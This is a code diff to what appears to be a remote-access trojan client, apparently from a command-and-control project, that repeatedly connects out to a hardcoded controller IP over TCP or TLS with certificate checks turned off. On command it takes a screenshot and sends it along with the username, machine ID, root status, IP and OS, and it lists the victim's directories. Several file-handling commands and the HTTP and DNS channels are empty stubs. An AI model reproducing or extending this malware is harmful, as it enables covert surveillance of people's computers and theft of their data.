@@ -15,19 +15,32 @@ Author: ISSAC
 
 #include <arpa/inet.h>
 
-///
+///OpenSSL
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #include "clsEDP.hpp"
-#include "clsInfoSpyder.hpp"
 #include "clsTools.hpp"
 #include "clsVictim.hpp"
 
-char* g_szIP = "10.98.242.96";
+#include "clsInfoSpyder.hpp"
+#include "clsScreenshot.hpp"
+#include "clsFileMgr.hpp"
+
+std::string g_szIP = "10.98.242.96";
 uint16_t g_nPort = 5000;
 
 const int g_nREAD_LENGTH = 65535;
 
 std::ostringstream g_oss;
+
+enum enConnectionMethod
+{
+    TCP,
+    TLS,
+    HTTP,
+    DNS,
+};
 
 void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
 {
@@ -37,22 +50,105 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
     if (vsMsg[0] == "info")
     {
         clsInfoSpyder spy;
+        clsScreenshot screen;
+
         auto stInfo = spy.m_info;
+        std::string szImg = "X";
+        if (stInfo.m_bHasDesktop)
+        {
+            auto stImage = screen.fnScreenshot();
+            szImg = clsEZData::fnb64Encode(stImage.vuData);
+        }
 
         std::vector<std::string> vsInfo = {
             "info",
+            szImg,
             stInfo.m_bHasDesktop ? "1" : "0",
+            stInfo.m_szIPv4,
             stInfo.m_szMachineID,
             stInfo.m_szUsername,
             std::to_string(stInfo.m_nUid),
-            stInfo.m_bIsRoot ? "1" : "0"
+            stInfo.m_bIsRoot ? "1" : "0",
+            stInfo.m_szOSName,
         };
 
         victim.fnSendCommand(vsInfo);
     }
+    else if (vsMsg[0] == "file")
+    {
+        clsFileMgr fileMgr;
+
+        if (vsMsg[1] == "init")
+        {
+            std::vector<std::string> vsMsg = {
+                "file",
+                "init",
+                fileMgr.m_szInitFileDir,
+            };
+
+            victim.fnSendCommand(vsMsg);
+        }
+        else if (vsMsg[1] == "sd")
+        {
+            auto ls = fileMgr.fnScandir(vsMsg[2]);
+            std::vector<std::vector<std::string>> v2d;
+
+            for (auto& s : ls)
+            {
+                std::vector<std::string> x = {
+                    s.mIsDir ? "1" : "0",
+                    s.szFilePath,
+                    std::to_string(s.nFileSize),
+                    s.szPermission,
+                    s.szCreationDate,
+                    s.szLastModifiedDate,
+                    s.szLastAccessedDate,
+                };
+
+                v2d.push_back(x);
+            }
+
+            std::vector<std::string> vuMsg = {
+                "file",
+                "sd",
+                vsMsg[2],
+                clsEZData::fnszSend2dParser(v2d, ","),
+            };
+
+            victim.fnSendCommand(vuMsg);
+        }
+        else if (vsMsg[1] == "wf")
+        {
+
+        }
+        else if (vsMsg[1] == "rf")
+        {
+
+        }
+        else if (vsMsg[1] == "df")
+        {
+
+        }
+        else if (vsMsg[1] == "uf")
+        {
+
+        }
+        else if (vsMsg[1] == "del")
+        {
+
+        }
+        else if (vsMsg[1] == "cp")
+        {
+
+        }
+        else if (vsMsg[1] == "mv")
+        {
+
+        }
+    }
 }
 
-void fnHandler(int sktSrv)
+void fnTcpHandler(int sktSrv)
 {
     clsTools::fnLogInfo("Starting session...");
 
@@ -99,12 +195,13 @@ void fnHandler(int sktSrv)
 
             auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
 
+
             // === handle packet ===
             if (cmd == 0)
             {
                 if (param == 0)
                 {
-                    // reserved handshake / ping
+                    close(sktSrv);
                 }
             }
             else if (cmd == 1)
@@ -159,9 +256,139 @@ void fnHandler(int sktSrv)
     clsTools::fnLogInfo("Session is terminated.");
 }
 
+void fnHttpHandler(int sktSrv)
+{
+
+}
+
+void fnTlsHandler(int nSktSrv, SSL* ssl)
+{
+    clsVictim victim(nSktSrv, ssl);
+    std::string szHello = "Hello TLS Server";
+    victim.fnSslSend(szHello);
+
+    std::vector<unsigned char> vuDynamicBuffer;
+    std::vector<unsigned char> vuStaticbuffer(clsEDP::MAX_SIZE);
+    int nRecv = 0;
+
+    do
+    {
+        nRecv = SSL_read(ssl, vuStaticbuffer.data(), vuStaticbuffer.size());
+        if (nRecv <= 0)
+            break;
+        
+        vuDynamicBuffer.insert(
+            vuDynamicBuffer.end(),
+            vuStaticbuffer.begin(),
+            vuStaticbuffer.begin() + nRecv
+        );
+
+        while (vuDynamicBuffer.size() >= clsEDP::HEADER_SIZE)
+        {
+            auto [cmd, param, len] = clsEDP::fnGetHeader(vuDynamicBuffer);
+            if (vuDynamicBuffer.size() < clsEDP::HEADER_SIZE + len)
+                break;
+            
+            clsEDP edp(vuDynamicBuffer);
+            vuDynamicBuffer = edp.fnGetMoreData();
+
+            auto [nCmd, nParam, nLength, vuMsg] = edp.fnGetMsg();
+            std::string szMsg(vuMsg.begin(), vuMsg.end());
+            std::cout << szMsg << std::endl;
+
+        }
+
+    } while (nRecv > 0);
+    
+}
+
+void fnTcpConnect(std::string& szIP, int nPort)
+{
+    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in srvAddr {};
+    srvAddr.sin_family = AF_INET;
+    srvAddr.sin_port = htons(nPort);
+    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
+
+    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
+    {
+
+        perror("connect");
+    }
+    else
+    {
+        fnTcpHandler(sktSrv);
+    }
+
+    close(sktSrv);
+}
+
+void fnTlsConnect(std::string& szIP, int nPort)
+{
+    SSL_library_init();
+    SSL_load_error_strings();
+
+    const SSL_METHOD* method = TLS_client_method();
+    SSL_CTX* ctx = SSL_CTX_new(method);
+
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
+
+    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in srvAddr {};
+    srvAddr.sin_family = AF_INET;
+    srvAddr.sin_port = htons(nPort);
+    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
+
+    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
+    {
+        perror("connect");
+    }
+
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sktSrv);
+    if (SSL_connect(ssl) <= 0)
+    {
+        ERR_print_errors_fp(stderr);
+        return;
+    }
+
+    fnTlsHandler(sktSrv, ssl);
+
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    close(sktSrv);
+    SSL_CTX_free(ctx);
+}
+
+void fnHttpConnect(std::string& szIP, int nPort)
+{
+    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in srvAddr {};
+    srvAddr.sin_family = AF_INET;
+    srvAddr.sin_port = htons(nPort);
+    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
+
+    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
+    {
+
+        perror("connect");
+    }
+    else
+    {
+        fnHttpHandler(sktSrv);
+    }
+}
+
+void fnDnsConnect(std::string& szIP, int nPort)
+{
+
+}
+
 int main(int argc, char *argv[])
 {
-    if (argc == 3)
+    enConnectionMethod enMethod;
+
+    if (argc >= 3)
     {
         g_szIP = argv[1];
         g_nPort = atoi(argv[2]);
@@ -171,21 +398,47 @@ int main(int argc, char *argv[])
         oss << "Input host: " << g_szIP << ":" << g_nPort;
         clsTools::fnLogInfo(oss.str());
         oss.clear();
+
+        if (argc == 4)
+        {
+            std::string method(argv[3]);
+            method = clsEZData::fnStrToUpper(method);
+
+            clsTools::fnLogInfo("Method: " + method);
+
+            if (method == "TCP")
+                enMethod = enConnectionMethod::TCP;
+            else if (method == "TLS")
+                enMethod = enConnectionMethod::TLS;
+            else if (method == "HTTP")
+                enMethod = enConnectionMethod::HTTP;
+            else if (method == "DNS")
+                enMethod = enConnectionMethod::DNS;
+        }
+
+        if (enMethod == NULL)
+            enMethod = enConnectionMethod::TCP;
     }
 
-    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
-    sockaddr_in srvAddr {};
-    srvAddr.sin_family = AF_INET;
-    srvAddr.sin_port = htons(g_nPort);
-    inet_pton(AF_INET, g_szIP, &srvAddr.sin_addr);
+    while (true)
+    {
+        switch (enMethod)
+        {
+            case enConnectionMethod::TCP:
+                fnTcpConnect(g_szIP, g_nPort);
+                break;
+            case enConnectionMethod::TLS:
+                fnTlsConnect(g_szIP, g_nPort);
+                break;
+            case enConnectionMethod::HTTP:
 
-    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
-    {
-        perror("connect");
-        return 1;
-    }
-    else
-    {
-        fnHandler(sktSrv);
+                break;
+            case enConnectionMethod::DNS:
+
+                break;
+            default:
+                fnTcpConnect(g_szIP, g_nPort);
+                break;
+        }
     }
 }
